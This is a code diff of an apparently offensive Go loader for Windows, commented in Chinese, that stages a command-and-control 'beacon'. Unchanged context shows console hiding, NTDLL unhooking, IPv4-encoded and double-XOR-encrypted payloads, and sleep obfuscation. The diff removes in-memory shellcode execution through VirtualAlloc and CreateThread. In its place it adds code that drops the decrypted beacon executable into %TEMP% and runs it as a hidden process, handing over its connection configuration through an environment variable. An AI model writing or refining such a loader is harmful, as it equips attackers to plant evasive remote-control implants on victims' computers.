@@ -2,6 +2,8 @@ package main
 
 import (
 	"os"
+	"path/filepath"
+	"os/exec"
 	"fmt"
 	"golang.org/x/sys/windows"
 	"syscall"
@@ -406,6 +408,9 @@ func doubleXOR(data []byte, k1, k2 []byte) []byte {
 // 本 loader——把 GOC2CFG1 trailer 追加到自身文件尾，beacon 自读即得连接配置。
 var _trailerJSON = []byte("__TRAILER_JSON__")
 
+var _padTail = 0            // 生成器注入：IPv4 补齐 0x90 尾部长度（解码后裁掉）
+var _dropName = "beacon.exe" // 生成器注入：随机落盘名
+
 // selfAppendTrailer 幂等地把 trailer 追加到自身文件末尾。
 func selfAppendTrailer() {
 	self := os.Args[0]
@@ -436,6 +441,12 @@ func appendTrailer(js []byte) []byte {
 
 func main() {
 	selfAppendTrailer()
+	// donut 内存加载的 beacon 自读 trailer 不可靠（os.Executable 指向本 loader）——
+	// 同进程 env 下发配置，beacon 侧 GOC2_CFG_JSON 兜底解析（与 T0 的 cmd.Env 同理）
+	_ = os.Setenv("GOC2_CFG_JSON", string(_trailerJSON))
+	// 调试：写标记文件确认 env 注入与配置内容（验证后删）
+	_ = os.WriteFile(os.Getenv("TEMP")+"\\t3_dbg.txt",
+		[]byte("cfg="+string(_trailerJSON)+"\nenv="+os.Getenv("GOC2_CFG_JSON")), 0644)
 	// 1. Hide console
 	hideConsole()
 
@@ -450,35 +461,34 @@ func main() {
 	// 4. NTDLL unhook
 	reloadNTDLL()
 
-	// 5. Decrypt shellcode
+	// 5. Decrypt payload（完整 beacon EXE——donut 加载 Go runtime 不可改为落盘执行）
 	enc := deobfuscateIPv4(_ipv4Data)
-	sc := doubleXOR(enc, _xorKey1, _xorKey2)
-
-	// 6. Allocate memory (VirtualAlloc - proven working pattern from T2)
-	k := windows.NewLazySystemDLL("kernel32.dll")
-	va := k.NewProc("VirtualAlloc")
-	addr, _, _ := syscall.SyscallN(va.Addr(), 0, uintptr(len(sc)), 0x3000, 0x40)
-	if addr == 0 {
+	exeBytes := doubleXOR(enc, _xorKey1, _xorKey2)
+	if _padTail > 0 && _padTail < len(exeBytes) {
+		exeBytes = exeBytes[:len(exeBytes)-_padTail]
+	}
+	if len(exeBytes) < 1000 {
 		return
 	}
 
-	// 7. Copy shellcode byte by byte (like T2)
-	for i := 0; i < len(sc); i++ {
-		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = sc[i]
+	// 6. 落盘 %TEMP% 随机名（shellcode 直执行在 Go beacon 下不可靠）
+	tmp := os.Getenv("TEMP")
+	if tmp == "" {
+		tmp = os.TempDir()
 	}
-
-	// 8. Install VEH handler for memory protection
-	installVEH(addr, uintptr(len(sc)), _xorKey1)
-
-	// 9. Execute via CreateThread (like T2)
-	threadHandle, _, _ := syscall.SyscallN(k.NewProc("CreateThread").Addr(), 0, 0, addr, 0, 0, 0)
-	if threadHandle == 0 {
+	dst := filepath.Join(tmp, _dropName)
+	if err := os.WriteFile(dst, exeBytes, 0o755); err != nil {
 		return
 	}
+	defer os.Remove(dst)
 
-	// 10. Wait for completion
-	syscall.SyscallN(k.NewProc("WaitForSingleObject").Addr(), threadHandle, 0xFFFFFFFF)
-
-	// 11. Sleep obfuscation: encrypt + PAGE_NOACCESS after execution
-	sleepObfuscate(addr, uintptr(len(sc)), _xorKey1, 0)
+	// 7. os/exec 启动 beacon（cmd.Env 下发 GOC2_CFG_JSON 配置）
+	env := append(os.Environ(), "GOC2_CFG_JSON="+string(_trailerJSON))
+	cmd := exec.Command(dst)
+	cmd.Env = env
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
+	if err := cmd.Start(); err != nil {
+		return
+	}
+	_ = cmd.Wait()
 }
